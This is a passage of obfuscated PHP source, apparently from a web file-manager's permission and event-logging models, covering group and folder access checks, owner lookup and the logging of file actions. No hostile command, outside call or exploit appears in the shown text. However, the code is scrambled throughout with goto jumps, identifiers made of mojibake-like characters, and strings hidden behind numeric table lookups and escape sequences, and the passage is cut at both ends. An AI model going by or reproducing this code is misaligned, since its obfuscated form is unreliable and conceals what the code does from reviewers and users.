B¢‚¹âäæœ; D¢‰Š£ªÀ¯: $aƒ¨¸Äö÷« =& $_SERVER[…ë˜õ]; $e„ŒÛ»øÖ = $aƒ¨¸Äö÷«[86]; $DÄ·èø‹Ò¿ = $aÒĞ‡¥Ô§«[$aƒ¨¸Äö÷«[478]]; goto DÉ¯›¾ïñÛ; EêÄÙÙÄé: } private function userIsRoot($EÕ¶ÇÒÒ ‡ = false) { $aœÃ¿ŒÁ°È =& $_SERVER[…ë˜õ]; if (!$EÕ¶ÇÒÒ ‡ && _get($GLOBALS, $aœÃ¿ŒÁ°È[479])) { return !0; } $EÄôäÂ™º„ = Model($aœÃ¿ŒÁ°È[501])->getInfo($EÕ¶ÇÒÒ ‡); $E„Ÿ‚ñ ™á = Model($aœÃ¿ŒÁ°È[1884])->listData($EÄôäÂ™º„[$aœÃ¿ŒÁ°È[1415]]); if ($E„Ÿ‚ñ ™á && $E„Ÿ‚ñ ™á[$aœÃ¿ŒÁ°È[1287]][$aœÃ¿ŒÁ°È[1885]] == 1) { return !0; } return !1; } private function sourceAuthInfo($aÈñ‹÷óª) { goto D§Ø“¤–Ôà; cá½Ô¨ÊÂ›: $Dë¬õ—ˆÉã = $cìö†‹›—->_listAppendPath($Dë¬õ—ˆÉã); $eÃìîÕ­‚× = $Dë¬õ—ˆÉã[0]; $EÂÅéÊÏŸ¼ = $eÃìîÕ­‚×[$Cäô“ÓâòŸ[489]]; goto fÇã›³­’; fÇã›³­’: if (isset($eÃìîÕ­‚×[$Cäô“ÓâòŸ[486]])) { $eöãíĞ¯¶ = explode($Cäô“ÓâòŸ[8], trim($eÃìîÕ­‚×[$Cäô“ÓâòŸ[489]], $Cäô“ÓâòŸ[8])); array_shift($eöãíĞ¯¶); $EÂÅéÊÏŸ¼ = $eÃìîÕ­‚×[$Cäô“ÓâòŸ[484]] . $Cäô“ÓâòŸ[1886] . implode($Cäô“ÓâòŸ[8], $eöãíĞ¯¶); } return array($Cäô“ÓâòŸ[407] => $eÃìîÕ­‚×[$Cäô“ÓâòŸ[28]], $Cäô“ÓâòŸ[75] => KodIO::make($eÃìîÕ­‚×[$Cäô“ÓâòŸ[390]]), $Cäô“ÓâòŸ[1887] => $EÂÅéÊÏŸ¼); goto A¹öË»Äë; D§Ø“¤–Ôà: $Cäô“ÓâòŸ =& $_SERVER[…ë˜õ]; $cìö†‹›— = Model($Cäô“ÓâòŸ[1209]); $eÃìîÕ­‚× = $cìö†‹›—->sourceInfo($aÈñ‹÷óª); goto eÀƒˆ¶‹¤¬; eÀƒˆ¶‹¤¬: if (!$eÃìîÕ­‚×) { return !1; } $cìö†‹›—->groupPathDisplay($eÃìîÕ­‚×); $Dë¬õ—ˆÉã = array($eÃìîÕ­‚×); goto cá½Ô¨ÊÂ›; A¹öË»Äë: } private function groupAuthInfo($AÇ¤›×¹ø, $dŒƒ”¿›š) { $EŞŸ» ‰°² =& $_SERVER[…ë˜õ]; $eø÷Ó‡‚Ÿ = Model($EŞŸ» ‰°²[480])->getInfo($dŒƒ”¿›š); return array($EŞŸ» ‰°²[1888] => intval($AÇ¤›×¹ø[$EŞŸ» ‰°²[400]]), $EŞŸ» ‰°²[1872] => $AÇ¤›×¹ø, $EŞŸ» ‰°²[1889] => LNG($EŞŸ» ‰°²[1890]), $EŞŸ» ‰°²[1881] => array($EŞŸ» ‰°²[407] => $eø÷Ó‡‚Ÿ[$EŞŸ» ‰°²[28]], $EŞŸ» ‰°²[75] => KodIO::make($eø÷Ó‡‚Ÿ[$EŞŸ» ‰°²[84]][$EŞŸ» ‰°²[390]]), $EŞŸ» ‰°²[1887] => $eø÷Ó‡‚Ÿ[$EŞŸ» ‰°²[485]])); } protected function groupRootAuth($e’Æ—òš¢Ô, $aÉçùÆ…›‰ = false) { goto CïÇìóìŒñ; AŞâ¤ÔÔÃ: $e†„¾§§×Ï = $this->sourceAuthSelect($FÄùãËŒİÍ[$aØÚá‘æ¸¡[84]][$aØÚá‘æ¸¡[390]]); $eÅîÃö‡ = $e†„¾§§×Ï ? $this->authMake($e†„¾§§×Ï, $aÉçùÆ…›‰) : !1; $BÜŠòñêÅÄ = $eÅîÃö‡ ? $eÅîÃö‡[$aØÚá‘æ¸¡[440]] : !1; goto c’ôè‚‚›; còŒš–‡É«: static $CùïÙÂíĞ = array(); if (isset($CùïÙÂíĞ[$fØ·Í‹×ŠÌ])) { return $CùïÙÂíĞ[$fØ·Í‹×ŠÌ]; } $FÄùãËŒİÍ = Model($aØÚá‘æ¸¡[480])->getInfo($e’Æ—òš¢Ô); goto B‰ÖááÖ¼¶; B‰ÖááÖ¼¶: $aÓ‚„ëÜ°ô = $this->userGroupList($aÉçùÆ…›‰); $d“‹ˆ±ç£İ = isset($aÓ‚„ëÜ°ô[$e’Æ—òš¢Ô]) ? $aÓ‚„ëÜ°ô[$e’Æ—òš¢Ô][$aØÚá‘æ¸¡[400]] : !1; if ($d“‹ˆ±ç£İ && Model($aØÚá‘æ¸¡[1863])->authCheckAction($d“‹ˆ±ç£İ[$aØÚá‘æ¸¡[400]], $aØÚá‘æ¸¡[1714])) { $CùïÙÂíĞ[$fØ·Í‹×ŠÌ] = $d“‹ˆ±ç£İ; return $d“‹ˆ±ç£İ; } goto AŞâ¤ÔÔÃ; CïÇìóìŒñ: $aØÚá‘æ¸¡ =& $_SERVER[…ë˜õ]; $aÉçùÆ…›‰ = $aÉçùÆ…›‰ ? $aÉçùÆ…›‰ : USER_ID; $fØ·Í‹×ŠÌ = $aÉçùÆ…›‰ . $aØÚá‘æ¸¡[1891] . $e’Æ—òš¢Ô; goto còŒš–‡É«; c’ôè‚‚›: $CùïÙÂíĞ[$fØ·Í‹×ŠÌ] = $BÜŠòñêÅÄ ? $BÜŠòñêÅÄ : $d“‹ˆ±ç£İ; return $CùïÙÂíĞ[$fØ·Í‹×ŠÌ]; goto CÂºË‚ÈÇÆ; CÂºË‚ÈÇÆ: } public function authOwnerApply($c…×æ…áéä) { goto AÆÅİ·ËŠ¡; C™æ öÍ½ã: $a‹§Çí¨  = Model($C™•è¦ôÖŠ[1209])->parentLevelArray($c…×æ…áéä[$C™•è¦ôÖŠ[481]]); $a‹§Çí¨  = array_merge(array($c…×æ…áéä[$C™•è¦ôÖŠ[390]]), array_reverse($a‹§Çí¨ )); $a¬¤”¬ôô‹ = $this->sourceAuthSelect($a‹§Çí¨ ); goto BÂÅÀ¤æ; BÂÅÀ¤æ: $B‘Áƒ§çé = array(); $d°Ä´¸¼õ‰ = array(); foreach ($a¬¤”¬ôô‹ as $fàîŒèéª  => $D™ö½–á…») { $díó¸—ß‰Š = $this->authFolderOwnerUser($D™ö½–á…»); $B‘Áƒ§çé[$fàîŒèéª ] = $díó¸—ß‰Š; $d°Ä´¸¼õ‰ = array_merge($d°Ä´¸¼õ‰, $díó¸—ß‰Š[$C™•è¦ôÖŠ[557]]); if ($díó¸—ß‰Š[$C™•è¦ôÖŠ[1893]]) { break; } } goto FƒãÇå–˜¦; FƒãÇå–˜¦: if (count($d°Ä´¸¼õ‰) == 0) { $d°Ä´¸¼õ‰ = $this->authFolderOwnerGroup($c…×æ…áéä[$C™•è¦ôÖŠ[478]]); } $d°Ä´¸¼õ‰ = array_unique($d°Ä´¸¼õ‰); if (AuthModel::authCheckRoot($c…×æ…áéä[$C™•è¦ôÖŠ[400]][$C™•è¦ôÖŠ[401]])) { $d°Ä´¸¼õ‰[] = USER_ID; } goto E±ÒªÊ‚ä³; AÆÅİ·ËŠ¡: $C™•è¦ôÖŠ =& $_SERVER[…ë˜õ]; if (empty($c…×æ…áéä[$C™•è¦ôÖŠ[400]]) || isset($c…×æ…áéä[$C™•è¦ôÖŠ[1892]]) && $c…×æ…áéä[$C™•è¦ôÖŠ[1892]]) { return $c…×æ…áéä; } if (AuthModel::authCheckRoot($c…×æ…áéä[$C™•è¦ôÖŠ[400]][$C™•è¦ôÖŠ[401]])) { return $c…×æ…áéä; } goto C™æ öÍ½ã; E±ÒªÊ‚ä³: $c…×æ…áéä[$C™•è¦ôÖŠ[400]][$C™•è¦ôÖŠ[1894]] = Model($C™•è¦ôÖŠ[497])->userListInfo($d°Ä´¸¼õ‰); return $c…×æ…áéä; goto A‘¶—¨èÜŠ; A‘¶—¨èÜŠ: } private function authFolderOwnerGroup($d‚Áœíá) { $fŒ¨»–ôÖ‹ =& $_SERVER[…ë˜õ]; $C¬ÒÀŞ´Ì“ = Model($fŒ¨»–ôÖ‹[1777])->where(array($fŒ¨»–ôÖ‹[1694] => $d‚Áœíá))->select(); $a›Üî‚Ù‹ = array(); if (!$C¬ÒÀŞ´Ì“) { return $a›Üî‚Ù‹; } foreach ($C¬ÒÀŞ´Ì“ as $eãÁ¼‘®ŒÉ) { $E¨°ÍÙ¼‰© = $this->authInfo($eãÁ¼‘®ŒÉ); if (AuthModel::authCheckRoot($E¨°ÍÙ¼‰©[$fŒ¨»–ôÖ‹[400]])) { $a›Üî‚Ù‹[] = $eãÁ¼‘®ŒÉ[$fŒ¨»–ôÖ‹[1531]]; } } return $a›Üî‚Ù‹; } private function authFolderOwnerUser($BÂŸîŒ“÷Ç) { $BÌƒ³¿ÛÂó =& $_SERVER[…ë˜õ]; $CË»ÜØˆñ = array(); $B¶ŞÄ˜ùµñ = !1; foreach ($BÂŸîŒ“÷Ç as $có‰¦Í…µÇ) { $c­—¦¿©ƒ = $this->authInfo($có‰¦Í…µÇ); if ($có‰¦Í…µÇ[$BÌƒ³¿ÛÂó[478]] == $BÌƒ³¿ÛÂó[491]) { $B¶ŞÄ˜ùµñ = !0; } if ($có‰¦Í…µÇ[$BÌƒ³¿ÛÂó[398]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($c­—¦¿©ƒ[$BÌƒ³¿ÛÂó[400]])) { $CË»ÜØˆñ[] = $có‰¦Í…µÇ[$BÌƒ³¿ÛÂó[478]]; } } } return array($BÌƒ³¿ÛÂó[557] => $CË»ÜØˆñ, $BÌƒ³¿ÛÂó[1893] => $B¶ŞÄ˜ùµñ); } public function authMake($E«ŠíÆõ™ˆ, $C§ƒ‘½“Ìá = false) { $d§’éß«¦ø =& $_SERVER[…ë˜õ]; $EÀç÷Å©–´ = $this->authArrayCheck($E«ŠíÆõ™ˆ, $C§ƒ‘½“Ìá); if ($EÀç÷Å©–´[$d§’éß«¦ø[1895]]) { $EÀç÷Å©–´[$d§’éß«¦ø[1895]] = $this->sourceAuthInfo($EÀç÷Å©–´[$d§’éß«¦ø[1895]]); } return $EÀç÷Å©–´; } public function authArrayCheck($c–Å­¨øã, $eéãßèÜÅ… = false) { goto Dì ëï; Aº›«³­éò: return $F®È‚Ü†½; goto e¥ãÆÃİÁŒ; EÛÎ™Õ’Ôµ: $d­Ÿ‚ïœ›´ = 0; $Aºç«¢¶ = 0; $F¬§¥¿ö¥ƒ = 0; goto a•Îİß–Œ“; aÃ°ƒ¤¡Õ: foreach ($c–Å­¨øã as $F¢Í¢í¬Š) { $DôåÄŠÚ = $this->authInfo($F¢Í¢í¬Š); if (!$DôåÄŠÚ) { continue; } $FšŸªÙ˜İ¹ = $F¢Í¢í¬Š[$eŞòÖÌ¥¶[478]]; $E•¾µ¸Ù—™ = intval($DôåÄŠÚ[$eŞòÖÌ¥¶[400]]); if ($F¢Í¢í¬Š[$eŞòÖÌ¥¶[398]] == SourceModel::TYPE_USER && $FšŸªÙ˜İ¹ == $eéãßèÜÅ…) { $bàÍÛ±§ë = !0; $f»…ÁŒÇ‰Ë = $DôåÄŠÚ; $c¬Û˜‰°×º = $E•¾µ¸Ù—™; } else { if ($F¢Í¢í¬Š[$eŞòÖÌ¥¶[398]] == SourceModel::TYPE_GROUP && $this->groupContainUser($FšŸªÙ˜İ¹, $eéãßèÜÅ…)) { $d­Ÿ‚ïœ›´ = !0; $cãºèÑºÀï = $this->groupStepToUserGroup($FšŸªÙ˜İ¹, $eéãßèÜÅ…); if ($cãºèÑºÀï < $b‘‡’ò©èê) { $b‘‡’ò©èê = $cãºèÑºÀï; $Aºç«¢¶ = $E•¾µ¸Ù—™; $F¬§¥¿ö¥ƒ = $DôåÄŠÚ; $Dˆ™¹ËÁß´ = $FšŸªÙ˜İ¹; } if ($cãºèÑºÀï == $b‘‡’ò©èê && $E•¾µ¸Ù—™ >= $Aºç«¢¶) { $Aºç«¢¶ = $E•¾µ¸Ù—™; $F¬§¥¿ö¥ƒ = $DôåÄŠÚ; $Dˆ™¹ËÁß´ = $FšŸªÙ˜İ¹; } } else { if ($FšŸªÙ˜İ¹ == $eŞòÖÌ¥¶[491]) { $C…¢à³±Î = !0; $D¥ë¡Ò¸ = $DôåÄŠÚ; $F†Áõ¬Ø­î = $E•¾µ¸Ù—™; } } } } if ($bàÍÛ±§ë) { $a§¤’ĞĞÊ = $c¬Û˜‰°×º; $DôåÄŠÚ = $f»…ÁŒÇ‰Ë; $fŸŠ§‚–ªÏ = LNG($eŞòÖÌ¥¶[1896]); } else { if ($d­Ÿ‚ïœ›´) { $a§¤’ĞĞÊ = $Aºç«¢¶; $DôåÄŠÚ = $F¬§¥¿ö¥ƒ; $CÌŠã­”îÃ = Model($eŞòÖÌ¥¶[480])->getInfo($Dˆ™¹ËÁß´); $fŸŠ§‚–ªÏ = $eŞòÖÌ¥¶[159] . $CÌŠã­”îÃ[$eŞòÖÌ¥¶[485]] . $eŞòÖÌ¥¶[1897] . LNG($eŞòÖÌ¥¶[1898]); } else { if ($C…¢à³±Î) { $a§¤’ĞĞÊ = $F†Áõ¬Ø­î; $DôåÄŠÚ = $D¥ë¡Ò¸; $fŸŠ§‚–ªÏ = LNG($eŞòÖÌ¥¶[1869]); } else { $a§¤’ĞĞÊ = 0; $DôåÄŠÚ = !1; $fŸŠ§‚–ªÏ = $eŞòÖÌ¥¶[33]; } } } $F®È‚Ü†½ = array($eŞòÖÌ¥¶[1888] => intval($a§¤’ĞĞÊ), $eŞòÖÌ¥¶[1872] => $DôåÄŠÚ, $eŞòÖÌ¥¶[1889] => $fŸŠ§‚–ªÏ, $eŞòÖÌ¥¶[1881] => $F¢Í¢í¬Š[$eŞòÖÌ¥¶[390]]); goto Aº›«³­éò; Dì ëï: $eŞòÖÌ¥¶ =& $_SERVER[…ë˜õ]; if (!$c–Å­¨øã) { return array($eŞòÖÌ¥¶[401] => 0, $eŞòÖÌ¥¶[440] => !1); } $eéãßèÜÅ… = $eéãßèÜÅ… ? $eéãßèÜÅ… : USER_ID; goto a¶¯³°óÍ; a•Îİß–Œ“: $b‘‡’ò©èê = 1000; $Dˆ™¹ËÁß´ = 0; $C…¢à³±Î = 0; goto AË¡±Ø¬¤; AË¡±Ø¬¤: $F†Áõ¬Ø­î = 0; $D¥ë¡Ò¸ = 0; $F¢Í¢í¬Š = array($eŞòÖÌ¥¶[390] => 0); goto aÃ°ƒ¤¡Õ; a¶¯³°óÍ: $bàÍÛ±§ë = 0; $c¬Û˜‰°×º = 0; $f»…ÁŒÇ‰Ë = 0; goto EÛÎ™Õ’Ôµ; e¥ãÆÃİÁŒ: } private function groupContainUser($D•†Ö·ñ†’, $Cø¢Ù¥Œó° = false) { return in_array($D•†Ö·ñ†’, $this->userGroupParents($Cø¢Ù¥Œó°)); } private function groupStepToUserGroup($bîÅí¸ôÕ, $a¤äÙÈ”ìŸ = false) { goto b÷íÍŒ¤¹œ; fÒ†œ‹œ˜: return $Cõ­¼ó¼›¶; goto FÑ¨Åíƒ¾²; b÷íÍŒ¤¹œ: $Dïİ ÎâÃŞ =& $_SERVER[…ë˜õ]; $CÂ¨‚·ŒÜº = $this->userGroupList($a¤äÙÈ”ìŸ); $Cõ­¼ó¼›¶ = 1000; goto D»ÔÎš°ò; D»ÔÎš°ò: $c«õ¾…˜ñâ = $GLOBALS[$Dïİ ÎâÃŞ[6]][$Dïİ ÎâÃŞ[87]][$Dïİ ÎâÃŞ[1788]] == 1; $DĞÒ‡‰â‚Ø = $c«õ¾…˜ñâ ? 3 : 2; foreach ($CÂ¨‚·ŒÜº as $b¸‰Éœ„™) { if ($b¸‰Éœ„™[$Dïİ ÎâÃŞ[1694]] == $bîÅí¸ôÕ) { return 0; } $aåÉ¨®Çìî = explode($Dïİ ÎâÃŞ[47], trim($b¸‰Éœ„™[$Dïİ ÎâÃŞ[481]], $Dïİ ÎâÃŞ[47])); if ($aåÉ¨®Çìî[0] == $Dïİ ÎâÃŞ[491] && count($aåÉ¨®Çìî) > $DĞÒ‡‰â‚Ø) { $cò“È¶‰¬æ = array_reverse(array_slice($aåÉ¨®Çìî, $DĞÒ‡‰â‚Ø)); $f…ĞĞÕ×‹õ = array_search($bîÅí¸ôÕ, $cò“È¶‰¬æ); if ($f…ĞĞÕ×‹õ !== !1 && $f…ĞĞÕ×‹õ + 1 <= $Cõ­¼ó¼›¶) { $Cõ­¼ó¼›¶ = $f…ĞĞÕ×‹õ + 1; } } } goto fÒ†œ‹œ˜; FÑ¨Åíƒ¾²: } private function userGroupList($e­äœ¸à¹ß = false) { $DÏÛ‚Û¢í =& $_SERVER[…ë˜õ]; static $EÊ‚©ÅÅà = array(); if (isset($EÊ‚©ÅÅà[$e­äœ¸à¹ß])) { return $EÊ‚©ÅÅà[$e­äœ¸à¹ß]; } $B±ì„¼è…§ = Model($DÏÛ‚Û¢í[501])->getInfo($e­äœ¸à¹ß); $EÊ‚©ÅÅà[$e­äœ¸à¹ß] = array_to_keyvalue($B±ì„¼è…§[$DÏÛ‚Û¢í[1870]], $DÏÛ‚Û¢í[1694]); return $EÊ‚©ÅÅà[$e­äœ¸à¹ß]; } public function userGroupParents($d¹¢Öæèé‹) { goto aÍ‘‡Â¢ŞÙ; aÍ‘‡Â¢ŞÙ: $E÷¿êÇëÆÃ =& $_SERVER[…ë˜õ]; static $CÔˆæ„ÒªŠ = array(); $d¹¢Öæèé‹ = $d¹¢Öæèé‹ ? $d¹¢Öæèé‹ : USER_ID; goto dÁ¼Öˆˆ; dÁ¼Öˆˆ: if (isset($CÔˆæ„ÒªŠ[$d¹¢Öæèé‹])) { return $CÔˆæ„ÒªŠ[$d¹¢Öæèé‹]; } $F‹Âˆ…‹ = $this->userGroupList($d¹¢Öæèé‹); $Dª… ºğÀ = array(); goto AÕ”ºå–Á“; aŸÓŒÉíÚ§: $CÔˆæ„ÒªŠ[$d¹¢Öæèé‹] = array_unique($Dª… ºğÀ); return $CÔˆæ„ÒªŠ[$d¹¢Öæèé‹]; goto f·¿‡ˆ®áˆ; AÕ”ºå–Á“: $bÑ—Ú¨Ùƒ = $GLOBALS[$E÷¿êÇëÆÃ[6]][$E÷¿êÇëÆÃ[87]][$E÷¿êÇëÆÃ[1788]] == 1; $fÇÈŸ ï‡µ = $bÑ—Ú¨Ùƒ ? 3 : 2; foreach ($F‹Âˆ…‹ as $eíïĞÄˆŞÁ) { $B‡Âà‡ÛÖœ = array($eíïĞÄˆŞÁ[$E÷¿êÇëÆÃ[1694]]); $bœŸö„©ºÔ = explode($E÷¿êÇëÆÃ[47], trim($eíïĞÄˆŞÁ[$E÷¿êÇëÆÃ[481]], $E÷¿êÇëÆÃ[47])); if ($bœŸö„©ºÔ[0] == $E÷¿êÇëÆÃ[491] && count($bœŸö„©ºÔ) > $fÇÈŸ ï‡µ) { $eÇ˜Åù¨¼ = array_slice($bœŸö„©ºÔ, $fÇÈŸ ï‡µ); $B‡Âà‡ÛÖœ = array_merge($B‡Âà‡ÛÖœ, array_reverse($eÇ˜Åù¨¼)); } $Dª… ºğÀ = array_merge($Dª… ºğÀ, $B‡Âà‡ÛÖœ); } goto aŸÓŒÉíÚ§; f·¿‡ˆ®áˆ: } public function authTargetInfoMake($Bå‰•ÖŠÖÏ) { goto eŒË½ÆÊ; E½…æÀø: foreach ($Bå‰•ÖŠÖÏ as $a°¥ã»ÛÙÕ) { if ($a°¥ã»ÛÙÕ[$d¯‚¼ÓİÓ[398]] == SourceModel::TYPE_USER) { $d…š©¦ËßÛ[] = intval($a°¥ã»ÛÙÕ[$d¯‚¼ÓİÓ[478]]); } else { if ($a°¥ã»ÛÙÕ[$d¯‚¼ÓİÓ[398]] == SourceModel::TYPE_GROUP) { $c«Ïí”©í[] = intval($a°¥ã»ÛÙÕ[$d¯‚¼ÓİÓ[478]]); } } } if ($d…š©¦ËßÛ) { $d…š©¦ËßÛ = Model($d¯‚¼ÓİÓ[497])->userListInfo($d…š©¦ËßÛ); } if ($c«Ïí”©í) { $eæ±‰é±÷æ = array($d¯‚¼ÓİÓ[1774] => array($d¯‚¼ÓİÓ[405], $c«Ïí”©í)); $c«Ïí”©í = Model($d¯‚¼ÓİÓ[480])->field($d¯‚¼ÓİÓ[1899])->where($eæ±‰é±÷æ)->select(); $c«Ïí”©í = array_to_keyvalue($c«Ïí”©í, $d¯‚¼ÓİÓ[1694]); } goto e¿èƒáº¶¡; eŒË½ÆÊ: $d¯‚¼ÓİÓ =& $_SERVER[…ë˜õ]; $d…š©¦ËßÛ = array(); $c«Ïí”©í = array(); goto E½…æÀø; e¿èƒáº¶¡: return array($d¯‚¼ÓİÓ[1900] => $d…š©¦ËßÛ, $d¯‚¼ÓİÓ[1901] => $c«Ïí”©í); goto bÑå’–Á¬Ñ; bÑå’–Á¬Ñ: } public function authInfo($d°½¦“‹”Û) { $dŒä³Ú£²– =& $_SERVER[…ë˜õ]; if ($d°½¦“‹”Û[$dŒä³Ú£²–[1791]]) { $E¤Ç˜•¢¹— = Model($dŒä³Ú£²–[1863])->listData($d°½¦“‹”Û[$dŒä³Ú£²–[1791]]); if (!$E¤Ç˜•¢¹—) { return !1; $b§å¦¡ÅĞ = Model($dŒä³Ú£²–[1863])->listData(); $d¬¸«³Àˆ = array_filter_by_field($b§å¦¡ÅĞ, $dŒä³Ú£²–[400], $dŒä³Ú£²–[491]); return $d¬¸«³Àˆ; } $fÚ¹ë§±Ç¢ = array_field_key($E¤Ç˜•¢¹—, array($dŒä³Ú£²–[388], $dŒä³Ú£²–[28], $dŒä³Ú£²–[400], $dŒä³Ú£²–[1715], $dŒä³Ú£²–[1717])); $fÚ¹ë§±Ç¢[$dŒä³Ú£²–[1902]] = $d°½¦“‹”Û; return $fÚ¹ë§±Ç¢; } else { return array($dŒä³Ú£²–[406] => 0, $dŒä³Ú£²–[1700] => $d°½¦“‹”Û[$dŒä³Ú£²–[1845]], $dŒä³Ú£²–[407] => $dŒä³Ú£²–[33], $dŒä³Ú£²–[1715] => $dŒä³Ú£²–[1903]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\165\162\x63\145\x5f\x65\x76\x65\156\164"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\151\155\145", "\164\x69\155\x65", "\151\156\x73\x65\162\164", "\146\165\156\143\x74\151\x6f\156"), array("\144\x65\163\143", '', "\151\x6e\x73\x65\x72\164\x2c\165\x70\144\x61\x74\145\54\163\x65\x6c\145\143\164", "\x6a\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($F®öÑ¶›‘Â, $bÚóƒŠÇ•—, $bÓ›»À·³Ô = '') { goto B‹Á¨ÒçßÛ; e¤©¦Š ·‚: if (!$f¥•³¥ˆË‚) { return !1; } if ($this->isCacheEvent($f¥•³¥ˆË‚, $bÚóƒŠÇ•—)) { return; } if ($bÓ›»À·³Ô && is_string($bÓ›»À·³Ô)) { $bÓ›»À·³Ô = array($c¢šßì¾‡í[1727] => $bÓ›»À·³Ô); } goto EÌóõíÒÇ±; EÌóõíÒÇ±: $E®šÒ«ã’ = array($c¢šßì¾‡í[404] => $F®öÑ¶›‘Â, $c¢šßì¾‡í[1904] => $f¥•³¥ˆË‚[$c¢šßì¾‡í[472]], $c¢šßì¾‡í[1905] => $f¥•³¥ˆË‚[$c¢šßì¾‡í[28]], $c¢šßì¾‡í[489] => $f¥•³¥ˆË‚[$c¢šßì¾‡í[489]], $c¢šßì¾‡í[1522] => USER_ID, $c¢šßì¾‡í[409] => $bÚóƒŠÇ•—, $c¢šßì¾‡í[1524] => $bÓ›»À·³Ô); $this->addSystemLog($bÚóƒŠÇ•—, $E®šÒ«ã’); return $this->add($E®šÒ«ã’); goto e…á³¨À; B‹Á¨ÒçßÛ: $c¢šßì¾‡í =& $_SERVER[…ë˜õ]; if (!$this->eventSave) { return; } $f¥•³¥ˆË‚ = Model($c¢šßì¾‡í[1209])->sourceInfo($F®öÑ¶›‘Â); goto e¤©¦Š ·‚; e…á³¨À: } private function addSystemLog($c–¸Íâ‚í, $bÍ£®¶œùä) { $d†ç°È„Œâ =& $_SERVER[…ë˜õ]; if ($c–¸Íâ‚í == $d†ç°È„Œâ[1906]) { $c–¸Íâ‚í = $bÍ£®¶œùä[$d†ç°È„Œâ[425]][$d†ç°È„Œâ[1907]]; } else { if (in_array($c–¸Íâ‚í, array($d†ç°È„Œâ[1671], $d†ç°È„Œâ[1908]))) { $c–¸Íâ‚í = $bÍ£®¶œùä[$d†ç°È„Œâ[425]][$d†ç°È„Œâ[734]]; } } $b¥ö©åŠá¿ = array_merge($bÍ£®¶œùä, array($d†ç°È„Œâ[1909] => $bÍ£®¶œùä[$d†ç°È„Œâ[390]], $d†ç°È„Œâ[1910] => $bÍ£®¶œùä[$d†ç°È„Œâ[1910]])); Model($d†ç°È„Œâ[1635])->addLog($d†ç°È„Œâ[1911] . $c–¸Íâ‚í, $b¥ö©åŠá¿); } private function isCacheEvent($e¥†„ŒÎ®Ä, $eµˆá¢œ º) { if ($e¥†„ŒÎ®Ä[$_SERVER[…ë˜õ][398]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($C¨½‡˜ğĞ±, $BÔ§Šø›í“) { $A¯›¹µò¢» =& $_SERVER[…ë˜õ]; $c‰ñ½óœ ³ = Model($A¯›¹µò¢»[1209])->sourceInfo($C¨½‡˜ğĞ±); $f»„ªº™• = array($A¯›¹µò¢»[1907] => $BÔ§Šø›í“, $A¯›¹µò¢»[28] => $c‰ñ½óœ ³[$A¯›¹µò¢»[28]]); return $this->addEvent($C¨½‡˜ğĞ±, $A¯›¹µò¢»[1906], $f»„ªº™•); } public function eventFileEdit($cÅƒ…­‚–‘) { $Aà²ÄîéŠ† =& $_SERVER[…ë˜õ]; $E£ò´ğ¨œÖ = array($Aà²ÄîéŠ†[1912] => $_SERVER[$Aà²ÄîéŠ†[1913]], $Aà²ÄîéŠ†[1914] => strtolower(ACTION)); return $this->addEvent($cÅƒ…­‚–‘, $Aà²ÄîéŠ†[1661], $E£ò´ğ¨œÖ); } public function eventRecycle($cÉˆ”·Ùœ˜, $E³¦ •ºï) { return $this->addEvent($cÉˆ”·Ùœ˜, $_SERVER[…ë˜õ][1908], $E³¦ •ºï); } public function eventRemove($EÍ»»¤Í…Ÿ) { $BÃ£øÔ†• =& $_SERVER[…ë˜õ]; $bˆ­Ü¹½Œ© = Model($BÃ£øÔ†•[1209])->sourceInfo($EÍ»»¤Í…Ÿ); $a¨¨Å£ĞŠ = $bˆ­Ü¹½Œ©[$BÃ£øÔ†•[28]]; return $this->addEvent($bˆ­Ü¹½Œ©[$BÃ£øÔ†•[472]], $BÃ£øÔ†•[1660], $a¨¨Å£ĞŠ); } public function eventShare($AÛ¹Šºç, $C²âì¡‚¯¶) { return $this->addEvent($AÛ¹Šºç, $_SERVER[…ë˜õ][1671], $C²âì¡‚¯¶); } public function eventMove($eïçØ‰ÁËÒ, $då§µÊÅ‰ø, $C„©ª¢çŠİ) { goto d½‰º¾Ù’‹; a˜È”Çøø: $this->addEvent($eïçØ‰ÁËÒ, $AƒÇŠÖäìà[515], $dÆ‹œ¦ì†Ğ); $DÇŒá°¨’Õ = $Dà®ßäˆŒ¯->sourceInfo($eïçØ‰ÁËÒ); $dÆ‹œ¦ì†Ğ = array($AƒÇŠÖäìà[390] => $DÇŒá°¨’Õ[$AƒÇŠÖäìà[390]], $AƒÇŠÖäìà[28] => $DÇŒá°¨’Õ[$AƒÇŠÖäìà[28]]); goto CÜ´íÀ½¡—; d‡´íÀ·ˆ„: $cÇĞ‡âšåÛ = $Dà®ßäˆŒ¯->sourceInfo($då§µÊÅ‰ø); $Eï ˆâ½• = $Dà®ßäˆŒ¯->sourceInfo($C„©ª¢çŠİ); $dÆ‹œ¦ì†Ğ = array($AƒÇŠÖäìà[1060] => $då§µÊÅ‰ø, $AƒÇŠÖäìà[1915] => $cÇĞ‡âšåÛ[$AƒÇŠÖäìà[28]], $AƒÇŠÖäìà[1895] => $cÇĞ‡âšåÛ[$AƒÇŠÖäìà[489]], $AƒÇŠÖäìà[1061] => $C„©ª¢çŠİ, $AƒÇŠÖäìà[1916] => $Eï ˆâ½•[$AƒÇŠÖäìà[28]], $AƒÇŠÖäìà[1917] => $Eï ˆâ½•[$AƒÇŠÖäìà[489]]); goto a˜È”Çøø; CÜ´íÀ½¡—: $this->addEvent($då§µÊÅ‰ø, $AƒÇŠÖäìà[1918], $dÆ‹œ¦ì†Ğ); goto bÏ„ˆŠ¾©; d½‰º¾Ù’‹: $AƒÇŠÖäìà =& $_SERVER[…ë˜õ]; $Dà®ßäˆŒ¯ = Model($AƒÇŠÖäìà[1209]); $DÇŒá°¨’Õ = $Dà®ßäˆŒ¯->sourceInfo($eïçØ‰ÁËÒ); goto d‡´íÀ·ˆ„; bÏ„ˆŠ¾©: } public function eventCopy($b İœ†à) { $this->eventCreate($b İœ†à, $_SERVER[…ë˜õ][513]); } public function eventRename($F£²ô›÷·—, $fœÆ™ÈÄ“î, $Bõ«Àœ‡İ±) { $cîéå¿¨‚í =& $_SERVER[…ë˜õ]; $b§’ä”ª— = array($cîéå¿¨‚í[1060] => $fœÆ™ÈÄ“î, $cîéå¿¨‚í[1061] => $Bõ«Àœ‡İ±); 